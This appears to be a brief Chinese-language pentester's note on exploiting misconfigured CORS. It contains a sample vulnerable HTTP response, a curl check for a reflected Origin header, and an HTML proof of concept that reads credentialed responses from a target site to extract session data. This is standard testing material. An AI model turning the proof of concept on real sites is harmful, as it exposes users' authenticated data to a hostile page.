
## CORS

Cross-origin resource sharing (CORS) 是一种浏览器机制，整个CORS通信过程，都是浏览器自动完成，不需要用户参与。可实现对域外访问内部资源时起到访问控制的作用，限制随意的访问。如果CORS策略设置不当，则会带来跨域攻击。

请求与响应

```
GET /Login/UserLogin HTTP/1.1
Host: 192.168.3.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Origin: null
```

```
HTTP/1.1 302 Found
Cache-Control: private
Content-Type: text/html; charset=utf-8
Location: /Error/ErrorPath404
Server: Microsoft-IIS/8
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
X-Powered-By: ASP.NET
Date: Thu, 02 Jan 2020 05:20:14 GMT
Connection: close
Content-Length: 136
```

### 验证CORS

1、burp suite
2、curl

```
# curl 172.16.34.4:4100/Login/SSOIndex?IsBack=1 -H "Origin:http://nolyvndiacjc.com" -I
```

### POC

```
<!DOCTYPE html>
<html>
<body>
<center>
<h2>CORS POC Exploit</h2>
<h3>Extract SID</h3>
 
<div id="demo">
<button type="button" onclick="cors()">Exploit</button>
</div>
 
<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("demo").innerHTML = alert(this.responseText);
    }
  };
  xhttp.open("GET", "https://target.com/info/", true);
  xhttp.withCredentials = true;
  xhttp.send();
}
</script>
 
</body>
</html>
```



### CORS Bypass

https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397

https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/

https://portswigger.net/web-security/cors












